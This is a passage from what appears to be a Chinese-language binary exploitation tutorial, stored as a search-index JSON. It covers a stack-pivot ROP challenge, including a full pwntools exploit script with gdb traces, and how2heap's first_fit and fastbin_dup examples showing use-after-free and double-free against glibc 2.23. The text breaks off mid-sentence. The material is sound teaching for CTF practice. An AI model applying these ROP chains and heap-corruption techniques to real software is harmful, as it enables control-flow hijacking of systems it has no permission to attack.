&lt;usefulGadgets+1&gt;: ret\n   0x80488c2 &lt;usefulGadgets+2&gt;: xchg   esp,eax\n   0x80488c3 &lt;usefulGadgets+3&gt;: ret\n   0x80488c4 &lt;usefulGadgets+4&gt;: mov    eax,DWORD PTR [eax]\n   0x80488c6 &lt;usefulGadgets+6&gt;: ret\n[------------------------------------stack-------------------------------------]\n0000| 0xf755cf1c --&gt; 0x80488c4 (&lt;usefulGadgets+4&gt;:      mov    eax,DWORD PTR [eax])\n0004| 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:     pop    ebx)\n0008| 0xf755cf24 --&gt; 0x1f7\n0012| 0xf755cf28 --&gt; 0x80488c7 (&lt;usefulGadgets+7&gt;:      add    eax,ebx)\n0016| 0xf755cf2c --&gt; 0x80486a3 (&lt;deregister_tm_clones+35&gt;:      call   eax)\n0020| 0xf755cf30 --&gt; 0xa ('\\n')\n0024| 0xf755cf34 --&gt; 0x0\n0028| 0xf755cf38 --&gt; 0x0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x080488c1 in usefulGadgets ()\ngdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0x804a024 --&gt; 0xf7772770 (&lt;foothold_function&gt;:     push   ebp)\nEBX: 0x0\nECX: 0x54 ('T')\nEDX: 0xf7731854 --&gt; 0x0\nESI: 0xf772fe28 --&gt; 0x1d1d30\nEDI: 0x0\nEBP: 0x0\nESP: 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:      pop    ebx)\nEIP: 0x80488c4 (&lt;usefulGadgets+4&gt;:      mov    eax,DWORD PTR [eax])\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x80488c1 &lt;usefulGadgets+1&gt;: ret\n   0x80488c2 &lt;usefulGadgets+2&gt;: xchg   esp,eax\n   0x80488c3 &lt;usefulGadgets+3&gt;: ret\n=&gt; 0x80488c4 &lt;usefulGadgets+4&gt;: mov    eax,DWORD PTR [eax]\n   0x80488c6 &lt;usefulGadgets+6&gt;: ret\n   0x80488c7 &lt;usefulGadgets+7&gt;: add    eax,ebx\n   0x80488c9 &lt;usefulGadgets+9&gt;: ret\n   0x80488ca &lt;usefulGadgets+10&gt;:        xchg   ax,ax\n[------------------------------------stack-------------------------------------]\n0000| 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:     pop    ebx)\n0004| 0xf755cf24 --&gt; 0x1f7\n0008| 0xf755cf28 --&gt; 0x80488c7 (&lt;usefulGadgets+7&gt;:      add    eax,ebx)\n0012| 0xf755cf2c --&gt; 0x80486a3 (&lt;deregister_tm_clones+35&gt;:      call   eax)\n0016| 0xf755cf30 --&gt; 0xa ('\\n')\n0020| 0xf755cf34 --&gt; 0x0\n0024| 0xf755cf38 --&gt; 0x0\n0028| 0xf755cf3c --&gt; 0x0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x080488c4 in usefulGadgets ()\ngdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xf7772770 (&lt;foothold_function&gt;:   push   ebp)\nEBX: 0x0\nECX: 0x54 ('T')\nEDX: 0xf7731854 --&gt; 0x0\nESI: 0xf772fe28 --&gt; 0x1d1d30\nEDI: 0x0\nEBP: 0x0\nESP: 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:      pop    ebx)\nEIP: 0x80488c6 (&lt;usefulGadgets+6&gt;:      ret)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x80488c2 &lt;usefulGadgets+2&gt;: xchg   esp,eax\n   0x80488c3 &lt;usefulGadgets+3&gt;: ret\n   0x80488c4 &lt;usefulGadgets+4&gt;: mov    eax,DWORD PTR [eax]\n=&gt; 0x80488c6 &lt;usefulGadgets+6&gt;: ret\n   0x80488c7 &lt;usefulGadgets+7&gt;: add    eax,ebx\n   0x80488c9 &lt;usefulGadgets+9&gt;: ret\n   0x80488ca &lt;usefulGadgets+10&gt;:        xchg   ax,ax\n   0x80488cc &lt;usefulGadgets+12&gt;:        xchg   ax,ax\n[------------------------------------stack-------------------------------------]\n0000| 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:     pop    ebx)\n0004| 0xf755cf24 --&gt; 0x1f7\n0008| 0xf755cf28 --&gt; 0x80488c7 (&lt;usefulGadgets+7&gt;:      add    eax,ebx)\n0012| 0xf755cf2c --&gt; 0x80486a3 (&lt;deregister_tm_clones+35&gt;:      call   eax)\n0016| 0xf755cf30 --&gt; 0xa ('\\n')\n0020| 0xf755cf34 --&gt; 0x0\n0024| 0xf755cf38 --&gt; 0x0\n0028| 0xf755cf3c --&gt; 0x0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x080488c6 in usefulGadgets ()\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#pivot","title":"pivot","text":"<p>\u57fa\u672c\u540c\u4e0a\uff0c\u4f46\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u628a\u4fee\u6539 rsp \u7684\u90e8\u5206\u4e5f\u7528 gadgets \u6765\u5b9e\u73b0\uff0c\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\u6211\u4eec\u4e0d\u9700\u8981\u4f2a\u9020\u4e00\u4e2a\u5806\u6808\uff0c\u5373\u4e0d\u7528\u7ba1 ebp \u7684\u5730\u5740\u3002\u5982\uff1a</p> <pre><code>payload_2  = \"A\" * 40\npayload_2 += p64(pop_rax)\npayload_2 += p64(leakaddr)\npayload_2 += p64(xchg_rax_rsp)\n</code></pre> <p>\u5b9e\u9645\u4e0a\uff0c\u6211\u672c\u4eba\u6b63\u662f\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u6211\u5728\u6784\u5efa payload \u65f6\uff0c<code>0x0000000000400ae0 &lt;+165&gt;: leave</code>\uff0cleave;ret \u7684\u5730\u5740\u5b58\u5728\u622a\u65ad\u5b57\u7b26 <code>0a</code>\uff0c\u8fd9\u6837\u5c31\u4e0d\u80fd\u901a\u8fc7\u6b63\u5e38\u7684\u65b9\u5f0f\u5199\u5165\u7f13\u51b2\u533a\uff0c\u5f53\u7136\u8fd9\u4e5f\u662f\u53ef\u4ee5\u89e3\u51b3\u7684\uff0c\u6bd4\u5982\u5148\u5c06 <code>0a</code> \u6362\u6210\u975e\u622a\u65ad\u5b57\u7b26\uff0c\u4e4b\u540e\u518d\u4f7f\u7528\u5bc4\u5b58\u5668\u5c06 <code>0a</code> \u5199\u5165\u8be5\u5730\u5740\uff0c\u8fd9\u4e5f\u662f\u901a\u5e38\u89e3\u51b3\u7f13\u51b2\u533a\u4e2d\u622a\u65ad\u5b57\u7b26\u7684\u65b9\u6cd5\uff0c\u4f46\u662f\u8fd9\u6837\u505a\u96be\u5ea6\u592a\u5927\uff0c\u4e0d\u63a8\u8350\uff0c\u611f\u5174\u8da3\u7684\u8bfb\u8005\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u3002</p> <pre><code>$ ropgadget --binary pivot --only \"mov|pop|call|add|xchg|ret\"\n0x0000000000400b09 : add rax, rbp ; ret\n0x000000000040098e : call rax\n0x0000000000400b05 : mov rax, qword ptr [rax] ; ret\n0x0000000000400b00 : pop rax ; ret\n0x0000000000400900 : pop rbp ; ret\n0x0000000000400b02 : xchg rax, rsp ; ret\nfrom pwn import *\n\n#context.log_level = 'debug'\n#context.terminal = ['konsole']\nio = process('./pivot')\nelf = ELF('./pivot')\nlibp = ELF('./libpivot.so')\n\nleave_ret = 0x0000000000400adf\n\nfoothold_plt     = elf.plt['foothold_function'] # 0x400850\nfoothold_got_plt = elf.got['foothold_function'] # 0x602048\n\npop_rax      = 0x0000000000400b00\npop_rbp      = 0x0000000000400900\nmov_rax_rax  = 0x0000000000400b05\nxchg_rax_rsp = 0x0000000000400b02\nadd_rax_rbp  = 0x0000000000400b09\ncall_rax     = 0x000000000040098e\n\nfoothold_sym = libp.symbols['foothold_function']\nret2win_sym  = libp.symbols['ret2win']\noffset = int(ret2win_sym - foothold_sym) # 0x14e\n\nleakaddr  = int(io.recv().split()[20], 16)\n\n# calls foothold_function() to populate its GOT entry, then queries that value into EAX\n#gdb.attach(io)\npayload_1  = p64(foothold_plt)\npayload_1 += p64(pop_rax)\npayload_1 += p64(foothold_got_plt)\npayload_1 += p64(mov_rax_rax)\npayload_1 += p64(pop_rbp)\npayload_1 += p64(offset)\npayload_1 += p64(add_rax_rbp)\npayload_1 += p64(call_rax)\n\nio.sendline(payload_1)\n\n# rsp = leakaddr\npayload_2  = \"A\" * 40\npayload_2 += p64(pop_rax)\npayload_2 += p64(leakaddr)\npayload_2 += p64(xchg_rax_rsp)\n\nio.sendline(payload_2)\nprint io.recvall()\n</code></pre> <p>\u8fd9\u6837\u57fa\u672c\u7684 ROP \u4e5f\u5c31\u4ecb\u7ecd\u5b8c\u4e86\uff0c\u66f4\u9ad8\u7ea7\u7684\u7528\u6cd5\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u4e2d\u518d\u4ecb\u7ecd\uff0c\u6240\u8c13\u7684\u9ad8\u7ea7\uff0c\u4e5f\u5c31\u662f gadgets \u6784\u9020\u66f4\u52a0\u5de7\u5999\uff0c\u8fd0\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684\u77e5\u8bc6\u66f4\u52a0\u5e95\u5c42\u800c\u5df2\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#316-linux","title":"3.1.6 Linux \u5806\u5229\u7528\uff08\u4e0a\uff09","text":"<ul> <li>Linux \u5806\u7b80\u4ecb</li> <li>how2heap</li> <li>first_fit</li> <li>fastbin_dup</li> <li>fastbin_dup_into_stack</li> <li>fastbin_dup_consolidate</li> <li>unsafe_unlink</li> <li>house_of_spirit</li> <li>\u53c2\u8003\u8d44\u6599</li> </ul>"},{"location":"Training/Material/Binary%20Exploitation/#linux","title":"Linux \u5806\u7b80\u4ecb","text":"<p>\u5806\u662f\u7a0b\u5e8f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\uff0c\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u589e\u957f\u3002\u5f53\u524d Linux \u4f7f\u7528\u7684\u5806\u5206\u914d\u5668\u88ab\u79f0\u4e3a ptmalloc2\uff0c\u5728 glibc \u4e2d\u5b9e\u73b0\u3002</p> <p>\u66f4\u8be6\u7ec6\u7684\u6211\u4eec\u5df2\u7ecf\u5728\u7ae0\u8282 1.5.8 \u4e2d\u4ecb\u7ecd\u4e86\uff0c\u7ae0\u8282 1.5.7 \u4e2d\u4e5f\u6709\u76f8\u5173\u5185\u5bb9\uff0c\u8bf7\u56de\u987e\u4e00\u4e0b\u3002</p> <p>\u5bf9\u5806\u5229\u7528\u6765\u8bf4\uff0c\u4e0d\u7528\u4e8e\u6808\u4e0a\u7684\u6ea2\u51fa\u80fd\u591f\u76f4\u63a5\u8986\u76d6\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4ece\u800c\u63a7\u5236 EIP\uff0c\u53ea\u80fd\u901a\u8fc7\u95f4\u63a5\u624b\u6bb5\u6765\u52ab\u6301\u7a0b\u5e8f\u63a7\u5236\u6d41\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#how2heap","title":"how2heap","text":"<p>how2heap \u662f\u7531 shellphish \u56e2\u961f\u5236\u4f5c\u7684\u5806\u5229\u7528\u6559\u7a0b\uff0c\u4ecb\u7ecd\u4e86\u591a\u79cd\u5806\u5229\u7528\u6280\u672f\uff0c\u8fd9\u7bc7\u6587\u7ae0\u6211\u4eec\u5c31\u901a\u8fc7\u8fd9\u4e2a\u6559\u7a0b\u6765\u5b66\u4e60\u3002\u63a8\u8350\u4f7f\u7528 Ubuntu 16.04 64\u4f4d\u7cfb\u7edf\u73af\u5883\uff0cglibc \u7248\u672c\u5982\u4e0b\uff1a</p> <pre><code>$ file /lib/x86_64-linux-gnu/libc-2.23.so\n/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped\n$ git clone https://github.com/shellphish/how2heap.git\n$ cd how2heap\n$ make\n</code></pre> <p>\u8bf7\u6ce8\u610f\uff0c\u4e0b\u6587\u4e2d\u8d34\u51fa\u7684\u4ee3\u7801\u662f\u6211\u7b80\u5316\u8fc7\u7684\uff0c\u5254\u9664\u548c\u4fee\u6539\u4e86\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u6ce8\u91ca\u548c\u4ee3\u7801\uff0c\u4ee5\u65b9\u4fbf\u5b66\u4e60\u3002\u53e6\u5916\uff0c\u6b63\u5982\u7ae0\u8282 4.3 \u4e2d\u6240\u8bb2\u7684\uff0c\u6dfb\u52a0\u7f16\u8bd1\u53c2\u6570 <code>CFLAGS += -fsanitize=address</code> \u53ef\u4ee5\u68c0\u6d4b\u5185\u5b58\u9519\u8bef\u3002\u4e0b\u8f7d\u6587\u4ef6</p>"},{"location":"Training/Material/Binary%20Exploitation/#first_fit","title":"first_fit","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    char* a = malloc(512);\n    char* b = malloc(256);\n    char* c;\n\n    fprintf(stderr, \"1st malloc(512): %p\\n\", a);\n    fprintf(stderr, \"2nd malloc(256): %p\\n\", b);\n    strcpy(a, \"AAAAAAAA\");\n    strcpy(b, \"BBBBBBBB\");\n    fprintf(stderr, \"first allocation %p points to %s\\n\", a, a);\n\n    fprintf(stderr, \"Freeing the first one...\\n\");\n    free(a);\n\n    c = malloc(500);\n    fprintf(stderr, \"3rd malloc(500): %p\\n\", c);\n    strcpy(c, \"CCCCCCCC\");\n    fprintf(stderr, \"3rd allocation %p points to %s\\n\", c, c);\n    fprintf(stderr, \"first allocation %p points to %s\\n\", a, a);\n}\n$ gcc -g first_fit.c\n$ ./a.out\n1st malloc(512): 0x1380010\n2nd malloc(256): 0x1380220\nfirst allocation 0x1380010 points to AAAAAAAA\nFreeing the first one...\n3rd malloc(500): 0x1380010\n3rd allocation 0x1380010 points to CCCCCCCC\nfirst allocation 0x1380010 points to CCCCCCCC\n</code></pre> <p>\u8fd9\u7b2c\u4e00\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86 glibc \u5806\u5206\u914d\u7684\u7b56\u7565\uff0c\u5373 first-fit\u3002\u5728\u5206\u914d\u5185\u5b58\u65f6\uff0cmalloc \u4f1a\u5148\u5230 unsorted bin\uff08\u6216\u8005fastbins\uff09 \u4e2d\u67e5\u627e\u9002\u5408\u7684\u88ab free \u7684 chunk\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u5c31\u4f1a\u628a unsorted bin \u4e2d\u7684\u6240\u6709 chunk \u5206\u522b\u653e\u5165\u5230\u6240\u5c5e\u7684 bins \u4e2d\uff0c\u7136\u540e\u518d\u53bb\u8fd9\u4e9b bins \u91cc\u53bb\u627e\u5408\u9002\u7684 chunk\u3002\u53ef\u4ee5\u770b\u5230\u7b2c\u4e09\u6b21 malloc \u7684\u5730\u5740\u548c\u7b2c\u4e00\u6b21\u76f8\u540c\uff0c\u5373 malloc \u627e\u5230\u4e86\u7b2c\u4e00\u6b21 free \u6389\u7684 chunk\uff0c\u5e76\u628a\u5b83\u91cd\u65b0\u5206\u914d\u3002</p> <p>\u5728 gdb \u4e2d\u8c03\u8bd5\uff0c\u4e24\u4e2a malloc \u4e4b\u540e\uff08chunk \u4f4d\u4e8e malloc \u8fd4\u56de\u5730\u5740\u51cf\u53bb 0x10 \u7684\u4f4d\u7f6e\uff09\uff1a</p> <pre><code>gef\u27a4  x/5gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000211 &lt;-- chunk a\n0x602010:   0x4141414141414141  0x0000000000000000\n0x602020:   0x0000000000000000\ngef\u27a4  x/5gx 0x602220-0x10\n0x602210:   0x0000000000000000  0x0000000000000111 &lt;-- chunk b\n0x602220:   0x4242424242424242  0x0000000000000000\n0x602230:   0x0000000000000000\n</code></pre> <p>\u7b2c\u4e00\u4e2a free \u4e4b\u540e\uff0c\u5c06\u5176\u52a0\u5165\u5230 unsorted bin \u4e2d\uff1a</p> <pre><code>gef\u27a4  x/5gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000211 &lt;-- chunk a [be freed]\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78      &lt;-- fd pointer, bk pointer\n0x602020:   0x0000000000000000\ngef\u27a4  x/5gx 0x602220-0x10\n0x602210:   0x0000000000000210  0x0000000000000110 &lt;-- chunk b\n0x602220:   0x4242424242424242  0x0000000000000000\n0x602230:   0x0000000000000000\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x602000, bk=0x602000\n \u2192   Chunk(addr=0x602010, size=0x210, flags=PREV_INUSE)\n[+] Found 1 chunks in unsorted bin.\n</code></pre> <p>\u7b2c\u4e09\u4e2a malloc \u4e4b\u540e\uff1a</p> <pre><code>gef\u27a4  x/5gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000211 &lt;-- chunk c\n0x602010:   0x4343434343434343  0x00007ffff7dd1d00\n0x602020:   0x0000000000000000\ngef\u27a4  x/5gx 0x602220-0x10\n0x602210:   0x0000000000000210  0x0000000000000111 &lt;-- chunk b\n0x602220:   0x4242424242424242  0x0000000000000000\n0x602230:   0x0000000000000000\n</code></pre> <p>\u6240\u4ee5\u5f53\u91ca\u653e\u4e00\u5757\u5185\u5b58\u540e\u518d\u7533\u8bf7\u4e00\u5757\u5927\u5c0f\u7565\u5c0f\u4e8e\u7684\u7a7a\u95f4\uff0c\u90a3\u4e48 glibc \u503e\u5411\u4e8e\u5c06\u5148\u524d\u88ab\u91ca\u653e\u7684\u7a7a\u95f4\u91cd\u65b0\u5206\u914d\u3002</p> <p>\u597d\u4e86\uff0c\u73b0\u5728\u6211\u4eec\u52a0\u4e0a\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u91cd\u65b0\u7f16\u8bd1\uff1a</p> <pre><code>$ gcc -fsanitize=address -g first_fit.c\n$ ./a.out\n1st malloc(512): 0x61500000fd00\n2nd malloc(256): 0x611000009f00\nfirst allocation 0x61500000fd00 points to AAAAAAAA\nFreeing the first one...\n3rd malloc(500): 0x61500000fa80\n3rd allocation 0x61500000fa80 points to CCCCCCCC\n=================================================================\n==4525==ERROR: AddressSanitizer: heap-use-after-free on address 0x61500000fd00 at pc 0x7f49d14a61e9 bp 0x7ffe40b526e0 sp 0x7ffe40b51e58\nREAD of size 2 at 0x61500000fd00 thread T0\n    #0 0x7f49d14a61e8  (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x601e8)\n    #1 0x7f49d14a6bcc in vfprintf (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x60bcc)\n    #2 0x7f49d14a6cf9 in fprintf (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x60cf9)\n    #3 0x400b8b in main /home/firmy/how2heap/first_fit.c:23\n    #4 0x7f49d109c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)\n    #5 0x400878 in _start (/home/firmy/how2heap/a.out+0x400878)\n\n0x61500000fd00 is located 0 bytes inside of 512-byte region [0x61500000fd00,0x61500000ff00)\nfreed by thread T0 here:\n    #0 0x7f49d14de2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca)\n    #1 0x400aa2 in main /home/firmy/how2heap/first_fit.c:17\n    #2 0x7f49d109c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)\n\npreviously allocated by thread T0 here:\n    #0 0x7f49d14de602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)\n    #1 0x400957 in main /home/firmy/how2heap/first_fit.c:6\n    #2 0x7f49d109c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)\n</code></pre> <p>\u4e00\u4e2a\u5f88\u660e\u663e\u7684 use-after-free \u6f0f\u6d1e\u3002\u5173\u4e8e\u8fd9\u7c7b\u6f0f\u6d1e\u7684\u8be6\u7ec6\u5229\u7528\u8fc7\u7a0b\uff0c\u6211\u4eec\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u91cc\u518d\u8bb2\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#fastbin_dup","title":"fastbin_dup","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    fprintf(stderr, \"Allocating 3 buffers.\\n\");\n    char *a = malloc(9);\n    char *b = malloc(9);\n    char *c = malloc(9);\n    strcpy(a, \"AAAAAAAA\");\n    strcpy(b, \"BBBBBBBB\");\n    strcpy(c, \"CCCCCCCC\");\n    fprintf(stderr, \"1st malloc(9) %p points to %s\\n\", a, a);\n    fprintf(stderr, \"2nd malloc(9) %p points to %s\\n\", b, b);\n    fprintf(stderr, \"3rd malloc(9) %p points to %s\\n\", c, c);\n\n    fprintf(stderr, \"Freeing the first one %p.\\n\", a);\n    free(a);\n    fprintf(stderr, \"Then freeing another one %p.\\n\", b);\n    free(b);\n    fprintf(stderr, \"Freeing the first one %p again.\\n\", a);\n    free(a);\n\n    fprintf(stderr, \"Allocating 3 buffers.\\n\");\n    char *d = malloc(9);\n    char *e = malloc(9);\n    char *f = malloc(9);\n    strcpy(d, \"DDDDDDDD\");\n    fprintf(stderr, \"4st malloc(9) %p points to %s the first time\\n\", d, d);\n    strcpy(e, \"EEEEEEEE\");\n    fprintf(stderr, \"5nd malloc(9) %p points to %s\\n\", e, e);\n    strcpy(f, \"FFFFFFFF\");\n    fprintf(stderr, \"6rd malloc(9) %p points to %s the second time\\n\", f, f);\n}\n$ gcc -g fastbin_dup.c\n$ ./a.out\nAllocating 3 buffers.\n1st malloc(9) 0x1c07010 points to AAAAAAAA\n2nd malloc(9) 0x1c07030 points to BBBBBBBB\n3rd malloc(9) 0x1c07050 points to CCCCCCCC\nFreeing the first one 0x1c07010.\nThen freeing another one 0x1c07030.\nFreeing the first one 0x1c07010 again.\nAllocating 3 buffers.\n4st malloc(9) 0x1c07010 points to DDDDDDDD the first time\n5nd malloc(9) 0x1c07030 points to EEEEEEEE\n6rd malloc(9) 0x1c07010 points to FFFFFFFF the second time\n</code></pre> <p>\u8fd9\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86\u5229\u7528 fastbins \u7684 double-free \u653b\u51fb\uff0c\u53ef\u4ee5\u6cc4\u6f0f\u51fa\u4e00\u5757\u5df2\u7ecf\u88ab\u5206\u914d\u7684\u5185\u5b58\u6307\u9488\u3002fastbins \u53ef\u4ee5\u770b\u6210\u4e00\u4e2a LIFO \u7684\u6808\uff0c\u4f7f\u7528\u5355\u94fe\u8868\u5b9e\u73b0\uff0c\u901a\u8fc7 fastbin-&gt;fd \u6765\u904d\u5386 fastbins\u3002\u7531\u4e8e free \u7684\u8fc7\u7a0b\u4f1a\u5bf9 free list \u505a\u68c0\u67e5\uff0c\u6211\u4eec\u4e0d\u80fd\u8fde\u7eed\u4e24\u6b21 free \u540c\u4e00\u4e2a chunk\uff0c\u6240\u4ee5\u8fd9\u91cc\u5728\u4e24\u6b21 free \u4e4b\u95f4\uff0c\u589e\u52a0\u4e86\u4e00\u6b21\u5bf9\u5176\u4ed6 chunk \u7684 free \u8fc7\u7a0b\uff0c\u4ece\u800c\u7ed5\u8fc7\u68c0\u67e5\u987a\u5229\u6267\u884c\u3002\u7136\u540e\u518d malloc \u4e09\u6b21\uff0c\u5c31\u5728\u540c\u4e00\u4e2a\u5730\u5740 malloc \u4e86\u4e24\u6b21\uff0c\u4e5f\u5c31\u6709\u4e86\u4e24\u4e2a\u6307\u5411\u540c\u4e00\u5757\u5185\u5b58\u533a\u57df\u7684\u6307\u9488\u3002</p> <p>libc-2.23 \u4e2d\u5bf9 double-free \u7684\u68c0\u67e5\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <pre><code>    /* Check that the top of the bin is not the record we are going to add\n       (i.e., double free).  */\n    if (__builtin_expect (old == p, 0))\n      {\n        errstr = \"double free or corruption (fasttop)\";\n        goto errout;\n      }\n</code></pre> <p>\u5b83\u5728\u68c0\u67e5 fast bin \u7684 double-free \u65f6\u53ea\u662f\u68c0\u67e5\u4e86\u7b2c\u4e00\u4e2a\u5757\u3002\u6240\u4ee5\u5176\u5b9e\u662f\u5b58\u5728\u7f3a\u9677\u7684\u3002</p> <p>\u4e09\u4e2a malloc \u4e4b\u540e\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a\n0x602010:   0x4141414141414141  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b\n0x602030:   0x4242424242424242  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c\n0x602050:   0x4343434343434343  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000020fa1 &lt;-- top chunk\n0x602070:   0x0000000000000000\n</code></pre> <p>\u7b2c\u4e00\u4e2a free \u4e4b\u540e\uff0cchunk a \u88ab\u6dfb\u52a0\u5230 fastbins \u4e2d\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a [be freed]\n0x602010:   0x0000000000000000  0x0000000000000000      &lt;-- fd pointer\n0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b\n0x602030:   0x4242424242424242  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c\n0x602050:   0x4343434343434343  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000020fa1\n0x602070:   0x0000000000000000\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)\n</code></pre> <p>\u7b2c\u4e8c\u4e2a free \u4e4b\u540e\uff0cchunk b \u88ab\u6dfb\u52a0\u5230 fastbins \u4e2d\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a [be freed]\n0x602010:   0x0000000000000000  0x0000000000000000      &lt;-- fd pointer\n0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b [be freed]\n0x602030:   0x0000000000602000  0x0000000000000000      &lt;-- fd pointer\n0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c\n0x602050:   0x4343434343434343  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000020fa1\n0x602070:   0x0000000000000000\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)  \u2190  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)\n</code></pre> <p>\u6b64\u65f6\u7531\u4e8e chunk a \u5904\u4e8e bin \u4e2d\u7b2c 2 \u5757\u7684\u4f4d\u7f6e\uff0c\u4e0d\u4f1a\u88ab double-free \u7684\u68c0\u67e5\u673a\u5236\u68c0\u67e5\u51fa\u6765\u3002\u6240\u4ee5\u7b2c\u4e09\u4e2a free \u4e4b\u540e\uff0cchunk a \u518d\u6b21\u88ab\u6dfb\u52a0\u5230 fastbins \u4e2d\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a [be freed again]\n0x602010:   0x0000000000602020  0x0000000000000000      &lt;-- fd pointer\n0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b [be freed]\n0x602030:   0x0000000000602000  0x0000000000000000      &lt;-- fd pointer\n0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c\n0x602050:   0x4343434343434343  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000020fa1\n0x602070:   0x0000000000000000\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  \u2190  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)  \u2190  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  \u2192  [loop detected]\n</code></pre> <p>\u6b64\u65f6 chunk a \u548c chunk b \u4f3c\u4e4e\u5f62\u6210\u4e86\u4e00\u4e2a\u73af\u3002</p> <p>\u518d\u4e09\u4e2a malloc \u4e4b\u540e\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk d, chunk f\n0x602010:   0x4646464646464646  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk e\n0x602030:   0x4545454545454545  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c\n0x602050:   0x4343434343434343  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000020fa1\n0x602070:   0x0000000000000000\n</code></pre> <p>\u6240\u4ee5\u5bf9\u4e8e fastbins\uff0c\u53ef\u4ee5\u901a\u8fc7 double-free 